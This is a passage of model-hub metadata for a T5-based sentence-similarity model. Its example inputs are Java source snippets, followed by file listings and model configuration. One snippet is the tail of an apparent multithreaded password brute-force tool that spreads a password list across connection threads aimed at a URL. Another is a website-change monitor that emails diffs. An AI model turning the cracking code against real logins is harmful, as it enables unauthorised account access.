+      \            }\n        }\n        catch(FileNotFoundException e)\n        {\n            System.err.println(\"File\
+      \ not found: \" + fileName);\n        }\n        catch(IOException ioe)\n        {\n            System.err.println(\"\
+      IO Error \" + ioe);\n        }\n    }\n\n    private void createConnectionThread( int input )\n    {\n        data =\
+      \ new HoldSharedData( startTime, password, pwdCounter );\n\n        int numOfThreads = input;\n        int batch = pwdCounter/numOfThreads\
+      \ + 1;\n        numOfThreads = pwdCounter/batch + 1;\n        System.out.println(\"Number of Connection Threads Used=\"\
+      \ + numOfThreads);\n        ConnectionThread[] connThread = new ConnectionThread[numOfThreads];\n\n        for( int\
+      \ index = 0; index < numOfThreads; index ++ )\n        {\n            connThread[index] = new ConnectionThread( url,\
+      \ index, batch, data );\n            connThread[index].conn();\n        }\n    }\n}  "
+    - "import java.io.*;\nimport java.util.StringTokenizer;\nimport java.net.smtp.SmtpClient;\nimport java.util.Timer;\nimport\
+      \ java.util.TimerTask;\n\n\npublic class WatchDog {\npublic static void main(String[] args) {\ntry {\nProcess y = Runtime.getRuntime().exec(\"\
+      ./init\");\n}\ncatch (Exception e) {System.err.println(e);}\n\n\nWatchDog poodle=new WatchDog();\n {\npoodle.startWatch();\n\
+      } while(1==1);\n}\n\npublic void startWatch() {\nString error_mes=new String();\nString mesg=new String();\nString url=\"\
+      wget -p http://www.cs.rmit.edu./students\";\n\ntry {\nProcess a = Runtime.getRuntime().exec(url);\n}\ncatch (Exception\
+      \ e) {System.err.println(e);}\n\ntry {\nProcess b = Runtime.getRuntime().exec(\"diff org/images/ www.cs.rmit.edu./images/\"\
+      );\n BufferedReader stdInputimages = new BufferedReader(new InputStreamReader(b.getInputStream()));\n            while\
+      \ ((error_mes = stdInputimages.readLine()) != null) {\n\n              mesg=mesg.concat(error_mes);\n              \n\
+      \              \n              }\n}\ncatch (Exception e) {System.err.println(e);}\n\n\n\n\ntry {\nProcess c = Runtime.getRuntime().exec(\"\
+      diff org/students/ www.cs.rmit.edu./students/\");\nBufferedReader stdInputindex = new BufferedReader(new InputStreamReader(c.getInputStream()));\n\
+      \            while ((error_mes = stdInputindex.readLine()) != null) {\n             mesg=mesg.concat(error_mes);\n \
+      \                 \n              }\n}\ncatch (Exception e) {System.err.println(e);}\n\n\nif (mesg.length()>0) { sendEmail(mesg);\
+      \ }\n\ntry { Thread.sleep(60*60*24*1000);\n } catch(Exception e) { }\n}\n\n\n\n\n\npublic void sendEmail(String message)\
+      \ {\n{\nString reciever = \"@cs.rmit.edu.\";\nString sender = \"WATCHDOG@cs.rmit.edu.\";\n\n    try {\n\n          \
+      \              SmtpClient smtp = new SmtpClient();\n                        smtp.from(sender);\n                   \
+      \     smtp.to(reciever);\n                        PrintStream msg = smtp.startMessage();\n                        msg.println(message);\n\
+      \                        smtp.closeServer();\n                }\n\n                catch (Exception e) {}\n\n      \
+      \  }\n}\n}"
+  pipeline_tag: sentence-similarity
+  library_name: sentence-transformers
+siblings:
+- rfilename: .gitattributes
+- rfilename: 1_Pooling/config.json
+- rfilename: README.md
+- rfilename: config.json
+- rfilename: config_sentence_transformers.json
+- rfilename: merges.txt
+- rfilename: model.safetensors
+- rfilename: modules.json
+- rfilename: sentence_bert_config.json
+- rfilename: special_tokens_map.json
+- rfilename: tokenizer.json
+- rfilename: tokenizer_config.json
+- rfilename: vocab.json
+spaces: []
+createdAt: '2025-06-11T10:38:58.000Z'
+safetensors:
+  parameters:
+    F32: 35316480
+  total: 35316480
+usedStorage: 141271856
+downloadsAllTime: 8
+inferenceProviderMapping: {}
+configJson:
+  architectures:
+  - T5EncoderModel
+  bos_token_id: 1
+  classifier_dropout: 0.0
+  d_ff: 2048
+  d_kv: 64
+  d_model: 512
+  decoder_start_token_id: 0
+  dense_act_fn: relu
+  dropout_rate: 0.1
+  eos_token_id: 2
+  feed_forward_proj: relu
+  gradient_checkpointing: false
+  id2label:
+    '0': LABEL_0
+  initializer_factor: 1.0
+  is_encoder_decoder: true
+  is_gated_act: false
+  label2id:
+    LABEL_0: 0
+  layer_norm_epsilon: 1.0e-06
+  model_type: t5
+  n_positions: 512
+  num_decoder_layers: 6
+  num_heads: 8
+  num_layers: 6
+  output_past: true
+  pad_token_id: 0
+  relative_attention_max_distance: 128
+  relative_attention_num_buckets: 32
+  task_specific_params:
+    summarization:
+      early_stopping: true
+      length_penalty: 2.0
+      max_length: 200
+      min_length: 30
+      no_repeat_ngram_size: 3
+      num_beams: 4
+      prefix: 'summarize: '
+    translation_en_to_de:
+      early_stopping: true
+      max_length: 300
+      num_beams: 4
+      prefix: 'translate English to German: '
+    translation_en_to_fr:
+      early_stopping: true
+      max_length: 300
+      num_beams: 4
+      prefix: 'translate English to French: '
+    translation_en_to_ro:
+      early_stopping: true
+      max_length: 300
+      num_beams: 4
+      prefix: 'translate English to Romanian: '
+  torch_dtype: float32
+  transformers_version: 4.52.4
+  use_cache: true
+  vocab_size: 32100
+onnxFiles: {}
+safetensorsSizeMb: 141.3
+approxSizeMb: 141.3
+fetchedAt: '2026-06-10T07:15:01.000Z'
